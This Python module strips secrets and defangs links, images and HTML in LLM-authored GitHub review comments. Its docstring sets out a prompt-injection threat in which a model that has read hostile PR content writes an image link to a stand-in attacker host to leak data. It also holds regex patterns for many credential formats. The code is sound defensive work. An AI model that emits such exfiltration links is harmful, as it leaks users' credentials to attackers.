"""Sanitize model-authored text before it is posted to GitHub.

Review bodies are written by an LLM that has just read attacker-authored PR
content, so the posted comment is the one channel that reliably leaves the
system. Two things must not survive that trip:

- **Secret-shaped strings.** Whatever the agent happened to read, a comment is a
  durable public copy of it. Credentials are redacted wherever they appear,
  including inside code fences.
- **Live markdown links and images.** A rendered `![](https://attacker/?d=…)`
  is fetched by every viewer's browser with no interaction, which turns a
  comment into an exfiltration request; a link is one click from the same
  thing. Both are rewritten to inert text so the URL stays visible and auditable
  but nothing loads.

Markdown neutralization deliberately skips fenced blocks and inline code spans.
Nothing renders in there — so nothing needs defusing — and rewriting it would
corrupt the code a review is quoting.
"""

from __future__ import annotations

import re

REDACTED = "[REDACTED SECRET]"

# Deliberately anchored on issuer-specific prefixes and shapes rather than
# entropy. A review quotes code constantly, and "long random-looking string"
# also describes a git SHA, a checksum, and a base64 test fixture.
_SECRET_PATTERNS: tuple[re.Pattern[str], ...] = (
    # PEM private keys (whole block, including the body).
    re.compile(
        r"-----BEGIN[ A-Z]*PRIVATE KEY-----.*?-----END[ A-Z]*PRIVATE KEY-----",
        re.DOTALL,
    ),
    re.compile(r"\bgh[pousr]_[A-Za-z0-9]{20,}"),  # GitHub tokens
    re.compile(r"\bgithub_pat_[A-Za-z0-9_]{20,}"),  # GitHub fine-grained PAT
    re.compile(r"\bsk-ant-[A-Za-z0-9_\-]{20,}"),  # Anthropic
    re.compile(r"\bsk-proj-[A-Za-z0-9_\-]{20,}"),  # OpenAI project keys
    re.compile(r"\bsk-[A-Za-z0-9]{32,}"),  # OpenAI classic
    re.compile(r"\bAIza[A-Za-z0-9_\-]{35}"),  # Google API keys
    re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"),  # AWS access key IDs
    re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}"),  # Slack
    re.compile(r"\bglpat-[A-Za-z0-9_\-]{20,}"),  # GitLab PAT
    re.compile(r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"),  # JWT
)

# Credentials embedded in a connection string (postgres://user:pw@host).
_URL_CREDENTIALS = re.compile(r"(?P<scheme>[a-zA-Z][a-zA-Z0-9+.\-]*://)[^\s/:@]+:[^\s/@]+@")

_IMAGE = re.compile(r"!\[(?P<alt>[^\]]*)\]\((?P<url>[^)\s]*)[^)]*\)")
_LINK = re.compile(r"(?<!!)\[(?P<text>[^\]]*)\]\((?P<url>[^)\s]*)[^)]*\)")
_AUTOLINK = re.compile(r"<((?:https?|ftp)://[^>\s]+)>", re.IGNORECASE)
_BARE_URL = re.compile(r"(?<![\w[])(?:(?:https?|ftp)://|www\.)[^\s<>()\[\]]+", re.IGNORECASE)

# Tags GitHub's markdown renderer keeps, and that can load or navigate.
_RISKY_HTML = re.compile(
    r"<(?P<slash>/?)(?P<tag>img|a|video|audio|source|picture|iframe|object|embed|svg|form|input|base|link|meta)\b",
    re.IGNORECASE,
)

_FENCE = re.compile(r"^\s{0,3}(`{3,}|~{3,})")
_INLINE_CODE = re.compile(r"(`+)(?:(?!\1).)*\1", re.DOTALL)


def sanitize_posted_body(text: str | None) -> str:
    """Return `text` with secrets redacted and links/images made inert."""
    if not text:
        return ""

    text = _redact_secrets(text)
    return "".join(
        chunk if is_code else _neutralize_markdown(chunk) for is_code, chunk in _split_code(text)
    )


def _redact_secrets(text: str) -> str:
    for pattern in _SECRET_PATTERNS:
        text = pattern.sub(REDACTED, text)
    return _URL_CREDENTIALS.sub(rf"\g<scheme>{REDACTED}@", text)


def _split_code(text: str) -> list[tuple[bool, str]]:
    """Split into (is_code, chunk) runs, treating fenced blocks as code.

    An unterminated fence runs to the end of the text, which is how GitHub
    renders it too.
    """
    segments: list[tuple[bool, str]] = []
    buffer: list[str] = []
    fence: str | None = None

    def flush(is_code: bool) -> None:
        if buffer:
            segments.append((is_code, "".join(buffer)))
            buffer.clear()

    for line in text.splitlines(keepends=True):
        if fence is None:
            match = _FENCE.match(line)
            if match:
                flush(False)
                fence = match.group(1)[0]
            buffer.append(line)
        else:
            buffer.append(line)
            if re.match(rf"^\s{{0,3}}{re.escape(fence)}{{3,}}\s*$", line):
                flush(True)
                fence = None

    flush(fence is not None)
    return segments


def _neutralize_markdown(text: str) -> str:
    out: list[str] = []
    last = 0
    for span in _INLINE_CODE.finditer(text):
        out.append(_neutralize_rendered(text[last : span.start()]))
        out.append(span.group(0))
        last = span.end()
    out.append(_neutralize_rendered(text[last:]))
    return "".join(out)


def _neutralize_rendered(text: str) -> str:
    text = _IMAGE.sub(lambda m: f"[image removed: {_defang(m.group('url'))}]", text)
    text = _LINK.sub(lambda m: f"{m.group('text')} ({_defang(m.group('url'))})", text)
    text = _AUTOLINK.sub(lambda m: _defang(m.group(1)), text)
    text = _BARE_URL.sub(lambda m: _defang(m.group(0)), text)
    return _RISKY_HTML.sub(lambda m: f"&lt;{m.group('slash')}{m.group('tag')}", text)


def _defang(url: str) -> str:
    """Make a URL non-clickable and non-autolinked while keeping it readable."""
    defanged = url.replace("://", "[://]")
    if defanged.lower().startswith("www."):
        defanged = "www[.]" + defanged[4:]
    return defanged
